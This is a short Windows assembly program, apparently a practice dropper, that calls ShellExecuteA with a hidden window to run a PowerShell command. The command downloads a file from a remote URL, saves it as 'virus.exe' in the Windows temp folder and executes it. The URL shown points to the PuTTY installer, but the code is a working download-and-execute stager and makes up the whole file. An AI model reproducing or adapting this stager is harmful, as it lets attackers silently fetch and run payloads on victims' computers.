extern _ShellExecuteA
global _main

section .data
	tipo db "open",0
	cmd db "cmd",0
	par db "/c powershell -Command wget 'https://the.earth.li/~sgtatham/putty/latest/w64/putty-64bit-0.78-installer.msi' -OutFile C:\Windows\Temp\virus.exe; C:\Windows\Temp\virus.exe",0

section .text
_main:
	push 0 ;terminal não aparecer
	push 0
	push par
	push cmd
	push tipo
	push 0
	call _ShellExecuteA
